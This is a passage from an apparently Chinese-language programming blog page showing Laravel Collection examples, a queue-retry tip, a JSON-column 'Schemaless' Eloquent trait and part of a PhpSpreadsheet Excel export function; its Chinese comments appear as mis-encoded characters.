&#125;);</span><br><span class="line"> $users = User::all();</span><br><span class="line">        $youngsters = $users-&gt;filter(<span class="function"><span class="keyword">function</span> (<span class="params">$value, $key</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $value-&gt;age &lt; <span class="number">35</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        $youngsters-&gt;all();</span><br><span class="line">        <span class="comment">// æ‰€æœ‰å¹´é¾„å°äº 35 çš„ç”¨æˆ·</span></span><br><span class="line">        $movies = collect([</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'Back To The Future'</span>,</span><br><span class="line">                        <span class="string">'releases'</span> =&gt; [<span class="number">1985</span>, <span class="number">1989</span>, <span class="number">1990</span>]</span><br><span class="line">                    ],</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'Fast and Furious'</span>,</span><br><span class="line">                        <span class="string">'releases'</span> =&gt; [<span class="number">2001</span>, <span class="number">2003</span>, <span class="number">2006</span>, <span class="number">2009</span>, <span class="number">2011</span>, <span class="number">2013</span>, <span class="number">2015</span>, <span class="number">2017</span>]</span><br><span class="line">                    ],</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'Speed'</span>,</span><br><span class="line">                        <span class="string">'releases'</span> =&gt; [<span class="number">1994</span>]</span><br><span class="line">                    ]</span><br><span class="line">                ]);</span><br><span class="line">        </span><br><span class="line">                $mostReleases = $movies-&gt;sortByDesc(<span class="function"><span class="keyword">function</span> (<span class="params">$movie, $key</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> count($movie[<span class="string">'releases'</span>]);</span><br><span class="line">                &#125;);</span><br><span class="line">        </span><br><span class="line">                $mostReleases-&gt;toArray();</span><br><span class="line">                <span class="comment">//åˆ—å‡ºä»¥ä¸Šæ˜ æ€»æ•°é™åºæ’åºçš„ç”µå½±</span></span><br><span class="line">        </span><br><span class="line">                dd($mostReleases-&gt;values()-&gt;toArray());</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   åˆ—å‡ºä»¥ä¸Šæ˜ æ€»æ•°é™åºæ’åºçš„ç”µå½±å¹¶é‡ç½®é”®å€¼</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                 $movies = collect([</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'Back To the Future'</span>, <span class="string">'genre'</span> =&gt; <span class="string">'scifi'</span>, <span class="string">'rating'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'The Matrix'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'fantasy'</span>, <span class="string">'rating'</span> =&gt; <span class="number">9</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'The Croods'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'animation'</span>, <span class="string">'rating'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'Zootopia'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'animation'</span>, <span class="string">'rating'</span> =&gt; <span class="number">4</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'The Jungle Book'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'fantasy'</span>, <span class="string">'rating'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">                        ]);</span><br><span class="line">                </span><br><span class="line">                        $genre = $movies-&gt;groupBy(<span class="string">'genre'</span>);</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                        [</span></span><br><span class="line"><span class="comment">                             "scifi" =&gt; [</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "Back To the Future", "genre" =&gt; "scifi", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                             ],</span></span><br><span class="line"><span class="comment">                             "fantasy" =&gt; [</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "The Matrix", "genre" =&gt; "fantasy", "rating" =&gt; 9,],</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "The Jungle Book", "genre" =&gt; "fantasy", "rating" =&gt; 5, ],</span></span><br><span class="line"><span class="comment">                             ],</span></span><br><span class="line"><span class="comment">                             "animation" =&gt; [</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "The Croods", "genre" =&gt; "animation", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "Zootopia", "genre" =&gt; "animation", "rating" =&gt; 4, ],</span></span><br><span class="line"><span class="comment">                             ],</span></span><br><span class="line"><span class="comment">                        ]</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                </span><br><span class="line">                        $rating = $movies-&gt;groupBy(<span class="function"><span class="keyword">function</span> (<span class="params">$movie, $key</span>) </span>&#123;</span><br><span class="line">                            <span class="keyword">return</span> $movie[<span class="string">'rating'</span>];</span><br><span class="line">                        &#125;);</span><br><span class="line">                </span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                        [</span></span><br><span class="line"><span class="comment">                           8 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "Back To the Future", "genre" =&gt; "scifi", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "The Croods", "genre" =&gt; "animation", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                           9 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "The Matrix", "genre" =&gt; "fantasy", "rating" =&gt; 9,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                           4 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "Zootopia","genre" =&gt; "animation", "rating" =&gt; 4,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                           5 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "The Jungle Book","genre" =&gt; "fantasy","rating" =&gt; 5,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                        ]</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    $list = collect([</span><br><span class="line">                                <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                            ]);</span><br><span class="line">                    </span><br><span class="line">                            <span class="comment">//è·å–å‰ä¸¤ä¸ªåå­—</span></span><br><span class="line">                            $firstTwo = $list-&gt;take(<span class="number">2</span>);</span><br><span class="line">                            <span class="comment">//['Albert', 'Ben']</span></span><br><span class="line">                    </span><br><span class="line">                            <span class="comment">//è·å–æœ€åä¸¤ä¸ªåå­—</span></span><br><span class="line">                            $lastTwo = $list-&gt;take(<span class="number">-2</span>);</span><br><span class="line">                            <span class="comment">//['Yuri', 'Zane']</span></span><br><span class="line">                            $list = collect([</span><br><span class="line">                                        <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                                    ]);</span><br><span class="line">                            </span><br><span class="line">                                    $chunks = $list-&gt;chunk(<span class="number">3</span>);</span><br><span class="line">                                    $chunks-&gt;toArray();</span><br><span class="line">                                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                    [</span></span><br><span class="line"><span class="comment">                                        ["Albert", "Ben", "Charles",],</span></span><br><span class="line"><span class="comment">                                        [3 =&gt; "Dan", 4 =&gt; "Eric", 5 =&gt; "Xavier",],</span></span><br><span class="line"><span class="comment">                                        [6 =&gt; "Yuri", 7 =&gt; "Zane",],</span></span><br><span class="line"><span class="comment">                                    ]</span></span><br><span class="line"><span class="comment">                                    */</span></span><br><span class="line">                                     $names = collect([</span><br><span class="line">                                                <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                                            ]);</span><br><span class="line">                                    </span><br><span class="line">                                            $names-&gt;transform(<span class="function"><span class="keyword">function</span> (<span class="params">$name, $key</span>) </span>&#123;</span><br><span class="line">                                                <span class="keyword">return</span> strlen($name);</span><br><span class="line">                                            &#125;);</span><br><span class="line">                                    </span><br><span class="line">                                            $names-&gt;toArray();</span><br><span class="line">                                            <span class="comment">//[6, 3, 7, 3, 4, 6, 4, 4,]</span></span><br><span class="line">                                             $names = collect([</span><br><span class="line">                                                        <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                                                    ]);</span><br><span class="line">                                            </span><br><span class="line">                                                    $names-&gt;transform(<span class="function"><span class="keyword">function</span> (<span class="params">$name, $key</span>) </span>&#123;</span><br><span class="line">                                                        <span class="keyword">return</span> strlen($name);</span><br><span class="line">                                                    &#125;);</span><br><span class="line">                                            </span><br><span class="line">                                                    $names-&gt;toArray();</span><br><span class="line">                                                    <span class="comment">//[6, 3, 7, 3, 4, 6, 4, 4,]</span></span><br></pre></td></tr></table></figure>
<h3 id="é˜Ÿåˆ—æ‰§è¡Œå¤±è´¥åå¤æ‰§è¡Œ"><a href="#é˜Ÿåˆ—æ‰§è¡Œå¤±è´¥åå¤æ‰§è¡Œ" class="headerlink" title="é˜Ÿåˆ—æ‰§è¡Œå¤±è´¥åå¤æ‰§è¡Œ"></a>é˜Ÿåˆ—æ‰§è¡Œå¤±è´¥åå¤æ‰§è¡Œ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ç”±äºæŠ¥é”™æˆ–è€…ä»€ä¹ˆåŸå› é˜Ÿåˆ—æ‰§è¡Œå¤±è´¥ï¼Œä½†æ˜¯é˜Ÿåˆ—çš„ attemptsä¸€ç›´ä¸º<span class="number">1</span>ï¼Œå¯ä»¥æ‰‹åŠ¨<span class="keyword">throw</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">catch</span> (\Throwable $e) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> \Exception(<span class="string">"queue fail"</span>);</span><br><span class="line">&#125;</span><br><span class="line">php artisan xx --tries=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<h3 id="å®ç°Schemaless"><a href="#å®ç°Schemaless" class="headerlink" title="å®ç°Schemaless"></a>å®ç°Schemaless</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE users (</span><br><span class="line">           id INT UNSIGNED NOT NULL AUTO_INCREMENT,</span><br><span class="line">           created_at timestamp <span class="literal">null</span>,</span><br><span class="line">           updated_at timestamp <span class="literal">null</span>,</span><br><span class="line">           data <span class="built_in">JSON</span> NOT NULL,</span><br><span class="line">           PRIMARY KEY(id)</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE users add name VARCHAR(<span class="number">100</span>) AS</span><br><span class="line">       (JSON_UNQUOTE(JSON_EXTRACT(data, <span class="string">'$.name'</span>))) AFTER id;</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE users add address VARCHAR(<span class="number">100</span>) AS</span><br><span class="line">       (JSON_UNQUOTE(JSON_EXTRACT(data, <span class="string">'$.address'</span>))) AFTER name;</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE users add level INT UNSIGNED AS</span><br><span class="line">       (JSON_EXTRACT(data, <span class="string">'$.level'</span>)) AFTER name;</span><br><span class="line">ç„¶åæ˜¯æ ¸å¿ƒä»£ç  Schemaless.phpï¼Œä»¥ trait çš„æ–¹å¼å®ç°ï¼šhttps:<span class="comment">//huoding.com/2017/01/14/590 </span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App;</span><br><span class="line"></span><br><span class="line">trait Schemaless</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDirty</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $dirty = collect(parent::getDirty());</span><br><span class="line"></span><br><span class="line">        $keys = $dirty-&gt;keys()-&gt;map(<span class="function"><span class="keyword">function</span>(<span class="params">$key</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array($key, $<span class="keyword">this</span>-&gt;virtual)) &#123;</span><br><span class="line">                $key = $<span class="keyword">this</span>-&gt;getDataColumn() . <span class="string">'-&gt;'</span> . $key;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $key;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $keys-&gt;combine($dirty)-&gt;all();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params">array $options = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$<span class="keyword">this</span>-&gt;exists) &#123;</span><br><span class="line">            $attributes = collect($<span class="keyword">this</span>-&gt;getAttributes());</span><br><span class="line"></span><br><span class="line">            $virtual = $attributes-&gt;only($<span class="keyword">this</span>-&gt;virtual);</span><br><span class="line"></span><br><span class="line">            $attributes = $attributes-&gt;diffKeys($virtual)-&gt;merge([</span><br><span class="line">                $<span class="keyword">this</span>-&gt;getDataColumn() =&gt; json_encode($virtual-&gt;all()),</span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line">            $<span class="keyword">this</span>-&gt;setRawAttributes($attributes-&gt;all());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> parent::save($options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDataColumn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $column;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($column === <span class="literal">null</span>) &#123;</span><br><span class="line">            $column = defined(<span class="string">'static::DATA'</span>) ? <span class="keyword">static</span>::DATA : <span class="string">'data'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $column;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æ¥ç€æ˜¯ Model å®ç° User.phpï¼Œé‡Œé¢æ¿€æ´»äº† schemalessï¼Œå¹¶è®¾ç½®äº†è™šæ‹Ÿå­—æ®µï¼š</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Eloquent\Model;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    use Schemaless;</span><br><span class="line"></span><br><span class="line">    protected $virtual = [<span class="string">'name'</span>, <span class="string">'address'</span>, <span class="string">'level'</span>];</span><br><span class="line"></span><br><span class="line">    protected $hidden = [<span class="string">'data'</span>];</span><br><span class="line">&#125;</span><br><span class="line">æœ€åæ˜¯ Controller å®ç° UsersController.phpï¼Œé‡Œé¢æ¼”ç¤ºäº†å¦‚ä½•åˆ›å»ºå’Œä¿®æ”¹ï¼š</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use App\User;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">User $user</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;user = $user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">store</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user = $<span class="keyword">this</span>-&gt;user;</span><br><span class="line"></span><br><span class="line">        $user-&gt;name = <span class="string">'è€ç‹'</span>;</span><br><span class="line">        $user-&gt;address = <span class="string">'ä¸œåŒ—'</span>;</span><br><span class="line">        $user-&gt;level = <span class="number">1</span>;</span><br><span class="line">        $user-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user = $<span class="keyword">this</span>-&gt;user-&gt;find(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        $user-&gt;address = <span class="string">'åŒ—äº¬'</span>;</span><br><span class="line">        $user-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PhpSpreadsheet-å¯¼å‡ºå›¾ç‰‡åˆ°-Excel"><a href="#PhpSpreadsheet-å¯¼å‡ºå›¾ç‰‡åˆ°-Excel" class="headerlink" title="PhpSpreadsheet å¯¼å‡ºå›¾ç‰‡åˆ° Excel"></a>PhpSpreadsheet å¯¼å‡ºå›¾ç‰‡åˆ° Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $spreadsheet = <span class="keyword">new</span> Spreadsheet();</span><br><span class="line">       $sheet = $spreadsheet-&gt;getActiveSheet();</span><br><span class="line">       <span class="comment">//è®¾ç½®sheetçš„åå­—  ä¸¤ç§æ–¹æ³• https://learnku.com/articles/26965</span></span><br><span class="line">       $sheet-&gt;setTitle(<span class="string">'phpspreadsheetâ€”â€”demo'</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;setTitle(<span class="string">'Hello'</span>);</span><br><span class="line">       <span class="comment">//è®¾ç½®ç¬¬ä¸€è¡Œå°æ ‡é¢˜</span></span><br><span class="line">       $k = <span class="number">1</span>;</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'A'</span> . $k, <span class="string">'é—®é¢˜'</span>);</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'B'</span> . $k, <span class="string">'é€‰é¡¹'</span>);</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'C'</span> . $k, <span class="string">'ç­”æ¡ˆ'</span>);</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'D'</span> . $k, <span class="string">'å›¾ç‰‡'</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// è®¾ç½®ä¸ªè¡¨æ ¼å®½åº¦</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'A'</span>)-&gt;setWidth(<span class="number">16</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'B'</span>)-&gt;setWidth(<span class="number">80</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'C'</span>)-&gt;setWidth(<span class="number">15</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'D'</span>)-&gt;setWidth(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// å‚ç›´å±…ä¸­</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'A'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'B'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'C'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'D'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line"></span><br><span class="line">       $info = $data;</span><br><span class="line">       <span class="comment">//  è®¾ç½®Aå•å…ƒæ ¼çš„å®½åº¦ åŒç†è®¾ç½®æ¯ä¸ª</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'A'</span>)-&gt;setWidth(<span class="number">20</span>);</span><br><span class="line">       <span class="comment">//  è®¾ç½®ç¬¬ä¸‰è¡Œçš„é«˜åº¦</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getRowDimension(<span class="string">'3'</span>)-&gt;setRowHeight(<span class="number">50</span>);</span><br><span class="line">       <span class="comment">//  A1æ°´å¹³å±…ä¸­</span></span><br><span class="line">       $styleArray = [</span><br><span class="line">           <span class="string">'alignment'</span> =&gt; [</span><br><span class="line">               <span class="string">'horizontal'</span> =&gt; \PhpOffice\PhpSpreadsheet\Style\Alignment::HORIZONTAL_CENTER,</span><br><span class="line">           ],</span><br><span class="line">       ];</span><br><span class="line">       $sheet-&gt;getStyle(<span class="string">'A1'</span>)-&gt;applyFromArray($styleArray);</span><br><span class="line">       <span class="comment">//  å°†A3åˆ°D4åˆå¹¶æˆä¸€ä¸ªå•å…ƒæ ¼</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;mergeCells(<span class="string">'A3:D4'</span>);</span><br><span class="line">       <span class="comment">//  æ‹†åˆ†åˆå¹¶å•å…ƒæ ¼</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;unmergeCells(<span class="string">'A3:D4'</span>);</span><br><span class="line">       <span class="comment">//  å°†A2åˆ°D8è¡¨æ ¼è¾¹æ¡† æ”¹å˜ä¸ºçº¢è‰²</span></span><br><span class="line">       $styleArray = [</span><br><span class="line">           <span class="string">'borders'</span> =&gt; [</span><br><span class="line">               <span class="string">'outline'</span> =&gt; [</span><br><span class="line">                   <span class="string">'borderStyle'</span> =&gt; \PhpOffice\PhpSpreadsheet\Style\Border::BORDER_THICK,</span><br><span class="line">                   <span class="string">'color'</span> =&gt; [<span class="string">'argb'</span> =&gt; <span class="string">'FFFF0000'</span>],</span><br><span class="line">               ],</span><br><span class="line">           ],</span><br><span class="line">       ];</span><br><span class="line">       <span class="comment">//  $sheet-&gt;getStyle('A2:E8')-&gt;applyFromArray($styleArray);</span></span><br><span class="line">       <span class="comment">//  è®¾ç½®è¶…é“¾æ¥</span></span><br><span class="line">       <span class="comment">//  $sheet-&gt;setCellValue('D6', 'www.baidu.com');</span></span><br><span class="line">       <span class="comment">//  $spreadsheet-&gt;getActiveSheet()-&gt;setCellValue('E6', 'www.baidu.com');</span></span><br><span class="line">       <span class="comment">//  å¾ªç¯èµ‹å€¼</span></span><br><span class="line">       $k = <span class="number">2</span>;</span><br><span class="line">       foreach ($info <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">           $sheet-&gt;setCellValue(<span class="string">'A'</span> . $k, $value[<span class="string">'question'</span>]);</span><br><span class="line">           $sheet-&gt;setCellValue(<span class="string">'B'</span> . $k, $value[<span class="string">'question_options'</span>]);</span><br><span 